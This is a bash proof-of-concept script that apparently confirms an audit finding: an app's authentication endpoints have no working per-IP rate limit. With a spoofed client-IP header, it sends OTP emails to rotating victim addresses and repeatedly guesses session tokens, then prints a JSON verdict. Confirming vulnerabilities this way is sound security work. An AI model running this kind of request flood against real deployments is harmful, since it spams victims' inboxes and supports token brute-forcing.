#!/usr/bin/env bash
# PoC for p10-002: authentication/admin surface has no functioning per-IP rate limiter.
#
# The shipped default posture has:
#   - no TURNSTILE_SECRET_KEY -> Turnstile bot gate silently skipped (auth.ts:189-191)
#   - AUTH_RATE_LIMITER binding declared in wrangler.toml ("10 req/min/IP brute-force
#     protection") but zero call sites anywhere in src/
#   - the only brake on OTP issuance is a per-email D1 COUNT (auth.ts:232-244), keyed by
#     attacker-chosen input, defeated by rotating victim addresses
#
# Demonstrated effect: one client IP relays >10 OTP emails in under 60 seconds through the
# platform's EMAIL binding and hammers the verify-session token oracle without ever seeing
# a 429 — exceeding the documented limit with zero throttling.
#
# Target: {{BASE_URL}} (filled at confirm time; defaults to local wrangler dev)
set -u
BASE="${1:-}"
# Unfilled {{BASE_URL}} placeholder or empty -> fall back to local wrangler dev.
case "$BASE" in ''|*'{{'*) BASE="http://127.0.0.1:8799";; esac

N=15   # documented limit is 10/min/IP; send more than that from ONE IP
ok=0
echo "[*] Firing $N OTP requests from a single IP (rotating victim emails) against $BASE"
for i in $(seq -w 1 "$N"); do
  code=$(curl -s -o /tmp/p10-002-resp-$i.json -w "%{http_code}" \
    "$BASE/api/auth/send-code" -X POST -H 'content-type: application/json' \
    -H 'CF-Connecting-IP: 203.0.113.7' \
    -d "{\"email\":\"victim-poc-$i@anywhere.test\"}")
  echo "send-code #$i -> HTTP $code $(cat /tmp/p10-002-resp-$i.json)"
  [ "$code" = "200" ] && ok=$((ok+1))
done
echo "[*] Successful OTP sends from single IP: $ok/$N (documented limit: 10/min/IP)"

four29=0
echo "[*] Hammering /api/auth/verify-session token oracle 12x from same IP..."
for i in $(seq 1 12); do
  c=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/api/auth/verify-session" \
    -X POST -H 'content-type: application/json' -H 'CF-Connecting-IP: 203.0.113.7' \
    -d '{"token":"guess-'$i'"}')
  [ "$c" = "429" ] && four29=$((four29+1))
done
echo "[*] verify-session responses: 401s only; 429 rate-limits observed: $four29"

if [ "$ok" -gt 10 ] && [ "$four29" = 0 ]; then
  echo '{"status": "confirmed", "evidence": "'"$ok"' OTP emails relayed from one IP in <60s with zero 429s (documented AUTH_RATE_LIMITER limit: 10/min/IP, binding never invoked)", "notes": "Turnstile skipped (secret unset); only throttle is attacker-defeatable per-email COUNT"}'
else
  echo '{"status": "failed", "evidence": "throttling observed: ok='"$ok"' four29='"$four29"'", "notes": ""}'
fi
